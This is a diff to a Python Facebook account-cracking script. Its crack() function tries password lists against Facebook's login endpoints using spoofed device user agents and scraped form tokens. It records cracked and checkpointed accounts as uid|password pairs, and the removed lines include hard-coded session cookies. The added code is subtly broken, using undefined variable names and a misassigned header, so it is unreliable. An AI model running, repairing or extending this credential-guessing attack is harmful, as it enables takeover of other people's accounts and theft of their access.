@@ -153,82 +153,38 @@ def crack(uid, password_list, total_count):
             deeevice = random.choice(["Nokia 2.4","TA-1277","TA-1357","Nokia C30","Nokia C12 Pro","TA-1339","Nokia C12","Nokia 3.4","Nokia G20","Nokia 6","Nokia C22","Nokia G22","Nokia G10","Nokia C31","TA-1499","TA-1418","Nokia C32"])
             deevice = random.choice(["2312DRAABG","2201117TG","M2101K6G","Redmi Note 14","2404ARN45A","22111317I","23053RN02A","M2101K7AI","22101316C","23129RAA4G","Redmi Note 9 Pro","Redmi Note 10 Pro"])
             device = random.choice(["M910x","D10i","2PXH3","D830x","U-2u","M910x","2PXH3","HTC_Desire_S_S510e","HTC_0P3P5","HTC_DesireHD_X315e","HTC_C715c","HTC_D616w"])
-            us = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/bn_IN;FBBV/"+bv+";FBCR/Jio;FBMF/redmi;FBBD/redmi;FBDV/"+deevice+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1"
+            us = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/en_US;FBBV/"+bv+";FBCR/Jio;FBMF/redmi;FBBD/redmi;FBDV/"+deevice+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1"
             up = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/id_ID;FBBV/"+bv+";FBCR/"+fbcr+";FBMF/"+fbmf+";FBBD/"+fbbd+";FBDV/"+model+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/"+fbdm+"};FB_FW/1"
-            url1 = "https://m.prod.facebook.com/"
-            head = {"authority": "m.prod.facebook.com",
-            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
-            "cache-control": "max-age=0",
-            "dpr": "3",
-            "sec-ch-prefers-color-scheme": "light",
-            "sec-fetch-dest": "document",
-            "sec-fetch-mode": "navigate",
-            "sec-fetch-site": "none",
-            "sec-fetch-user": "?1",
-            "upgrade-insecure-requests": "1",
-            "user-agent": us,
-            "viewport-width": "980"}
-            requu1 = Session.get(url1,headers=head)
-            log_data = {
-            'jazoest': re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1),
-            'lsd': re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1),
-            'display': '',
-            'isprivate': '',
-            'return_session': '',
-            'skip_api_login': '',
-            'signed_next': '',
-            'trynum': '5',
-            'timezone': '-330',
-            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
-            'lgnrnd': '111035_Vn68',
-            'lgnjs': '1765739436',
-            'shared_prefs_data': 'eyIzMDAwMCI6W3sidCI6MTc2NTczOTQzNi44MTksImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6ZmFsc2V9XSwiMzAwMDEiOlt7InQiOjE3NjU3Mzk0MzYuODE5LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOjV9XSwiMzAwMDIiOlt7InQiOjE3NjU3Mzk0MzYuODE5LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOjJ9XSwiMzAwMDMiOlt7InQiOjE3NjU3Mzk0MzYuODIsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6WyJlbi1VUyIsImVuIl19XSwiMzAwMDQiOlt7InQiOjE3NjU3Mzk0MzYuODIsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6MTUwfV0sIjMwMDA1IjpbeyJ0IjoxNzY1NzM5NDM2LjgyLCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOnsidyI6OTUzLCJoIjo3NzZ9fV0sIjMwMDA3IjpbeyJ0IjoxNzY1NzM5NDM2LjgyLCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOiJncmFudGVkIn1dLCIzMDAwOCI6W3sidCI6MTc2NTczOTQzNi44ODEsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6ImdyYW50ZWQifV0sIjMwMDEyIjpbeyJ0IjoxNzY1NzM5NDM2LjgyMywiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjoiR29vZ2xlIEluYy4ifV0sIjMwMDEzIjpbeyJ0IjoxNzY1NzM5NDM2LjgyNCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjoiNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xNDMuMC4wLjAgU2FmYXJpLzUzNy4zNiBFZGcvMTQzLjAuMC4wIn1dLCIzMDAxNSI6W3sidCI6MTc2NTczOTQzNi44MjQsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6IldpbjMyIn1dLCIzMDAxOCI6W3sidCI6MTc2NTczOTQzNi44MjQsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6Mn1dLCIzMDAyMiI6W3sidCI6MTc2NTczOTQzNi44MzMsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6dHJ1ZX1dLCIzMDA0MCI6W3sidCI6MTc2NTczOTQzNi44MzQsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6LTMzMH1dLCIzMDA5MyI6W3sidCI6MTc2NTczOTQzNi44MzQsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6MH1dLCIzMDA5NCI6W3sidCI6MTc2NTczOTQzNi44MzQsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xNDMuMC4wLjAgU2FmYXJpLzUzNy4zNiBFZGcvMTQzLjAuMC4wIn1dLCIzMDA5NSI6W3sidCI6MTc2NTczOTQzNi44MzQsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6OH1dLCIzMDEwNiI6W3sidCI6MTc2NTczOTQzNi44MDcsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6ZmFsc2V9LHsidCI6MTc2NTczOTQzNy4yNzksImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6dHJ1ZX1dLCIzMDEwNyI6W3sidCI6MTc2NTczOTQzNi44MDgsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6ZmFsc2V9XX0=',
-            'email': uid,
-            'prefill_contact_point': uid,
-            'prefill_source': 'browser_onload',
-            'prefill_type': 'contact_point',
-            'first_prefill_source': 'browser_onload',
-            'first_prefill_type': 'contact_point',
-            'had_cp_prefilled': 'true',
-            'had_password_prefilled': 'false',
-            'ab_test_data': 'A/EAAAAAAAAAAACAAAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAARAAA',
-            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
-            cookies = {
-            'dbln': '%7B%22100052156371595%22%3A%22zz4SUvdm%22%7D',
-            'sb': 'vv1mZoqkaQr8BYILQ8WaAKOT',
-            'datr': 'PJp1ZglQIotPNJW3IGpT68nu',
-            'ps_l': '1',
-            'ps_n': '1',
-            'locale': 'hi_IN',
-            'wd': '953x776',
-            'fr': '1xnT8Z5CfAaMbilAo.AWc_YvxlM8wllAdjH2VEf4pIhKwB-W9RIgv31DUH0TTE0dpzEEc.BpPkb6..AAA.0.0.BpPwup.AWeUHcEX6XJ4zqiHEDMkAspuBQI',}
-            url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028"
+            url1 = "https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=1257995441580782&kid_directed_site=0&app_id=1257995441580782&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fclient_id%3D1257995441580782%26redirect_uri%3Dhttps%253A%252F%252Fmy.plagramme.com%252Fusers%252Ffacebook%252Fcallback%26scope%3Demail%252Cpublic_profile%26response_type%3Dcode%26state%3DxVgyvz0tqpnLJDIIXDB1oxqrqdc99sTGaVVdmeVi%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0388496f-9bad-4e7f-b2df-62e676ad873e%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmy.plagramme.com%2Fusers%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DxVgyvz0tqpnLJDIIXDB1oxqrqdc99sTGaVVdmeVi%23_%3D_&display=touch&locale=en_US&pl_dbl=0&refsrc=deprecated"
+            requu1 = session.get(url1)
+            log_data = {'try_number': '0', 'unrecognized_tries': '0', 'email': ids, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': '0', 'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas), 'bi_wvdp': '', 'fb_dtsg': '', 'jazoest': re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1), '__dyn': '', '__csr': '', '__req': random.choice(["1","2","3","4","5","6","7","8","9","0"]), '__fmt': '0', '__a': '',  '__user': '0'}
+            #url = "https://x.prod.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fauth.huffpost.com%252Flogin%252Fcallback%26scope%3Demail%252Cpublic_profile%26state%3Di--slwF8Cg0z_6V_hAmn7TmLJfJkK0XF%26client_id%3D191788634204473%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dea798105-d632-4fcc-8498-9c6f3e0bdb90%26tp%3Dunspecified%26cbt%3D1734080551001&lwv=100"
+            url = "https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
             headers = {
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'user-agent': us,
+            'Accept-Encoding': 'gzip, deflate',
+            'accept': '*/*',
+            'Connection': 'keep-alive',
             'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'no-cache',
             'content-type': 'application/x-www-form-urlencoded',
-            'dpr': '1',
-            'origin': 'https://www.facebook.com',
-            'pragma': 'no-cache',
-            'priority': 'u=0, i',
-            'referer': 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Microsoft Edge";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
-            'sec-ch-ua-full-version-list': '"Microsoft Edge";v="143.0.3650.80", "Chromium";v="143.0.7499.110", "Not A(Brand";v="24.0.0.0"',
-            'sec-ch-ua-mobile': '?0',
+            'origin': 'https://m.facebook.com',
+            'priority': 'u=1, i',
+            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=507811537136246&kid_directed_site=0&app_id=507811537136246&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv10.0%2Fdialog%2Foauth%3Fapp_id%3D507811537136246%26cbt%3D1736483470728%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfadd3b7728fbfb6c3%2526domain%253Dwww.z2u.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.z2u.com%25252Ff3fcbc8cc23807a4b%2526relation%253Dopener%26client_id%3D507811537136246%26display%3Dpopup%26domain%3Dwww.z2u.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.z2u.com%252Flogin.html%26locale%3Den_US%26logger_id%3Df4ae87efc07dfc1f4%26origin%3D1%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df98748ee374d96fe2%2526domain%253Dwww.z2u.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.z2u.com%25252Ff3fcbc8cc23807a4b%2526relation%253Dopener%2526frame%253Df81b6c91ffd56da37%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv10.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df98748ee374d96fe2%26domain%3Dwww.z2u.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.z2u.com%252Ff3fcbc8cc23807a4b%2526relation%3Dopener%2526frame%3Df81b6c91ffd56da37%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duer_denied&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Not-A.Brand";v="24", "Chromium";v="128"',
+            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="24.0.0.0", "Chromium";v="128.0.6613.137"',
+            'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-model': '""',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-ch-ua-platform-version': '"10.0.0"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
+            'sec-ch-ua-platform': '"Linux"',
+            'sec-ch-ua-platform-version': '"5.15.123"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36 Edg/143.0.0.0',
-            'viewport-width': '953',}        
-            respon = Session.post(url,data=log_data,cookies=cookies,headers=headers,allow_redirects=False)
+            'x-asbd-id': '129477',
+            'x-fb-lsd': us,
+            'x-requested-with': 'XMLHttpRequest',
+            'x-response-format': 'JSONStream'}   
+            respon = Session.post(url,data=log_data,headers=headers,allow_redirects=False) #proxies=proxs)
             log_cookies = Session.cookies.get_dict().keys()
             # Check response
             if "c_user" in log_cookies:
@@ -249,7 +205,7 @@ def crack(uid, password_list, total_count):
                 cps.append(uid+"|"+pw)
                 continue
             else:
-                #print(f"\r\033[1;91m [ERROR] - Status code {respon.status_code}")
+                print(f"\r\033[1;91m [ERROR] - Status code {respon.status_code}")
                 continue
                 
     except requests.exceptions.Timeout:
@@ -259,13 +215,13 @@ def crack(uid, password_list, total_count):
         time.sleep(5)
         return False
     except requests.exceptions.RequestException as e:
-        #print(f"\r\033[1;91m [Request Error] {uid} - {str(e)[:50]}")
+        print(f"\r\033[1;91m [Request Error] {uid} - {str(e)[:50]}")
         return False
     except KeyboardInterrupt:
         print(f"\r\033[1;93m [Interrupted] User stopped the process")
         raise
     except Exception as e:
-        #print(f"\r\033[1;91m [Unexpected Error] {uid} - {str(e)[:50]}")
+        print(f"\r\033[1;91m [Unexpected Error] {uid} - {str(e)[:50]}")
         return False
     
     return False
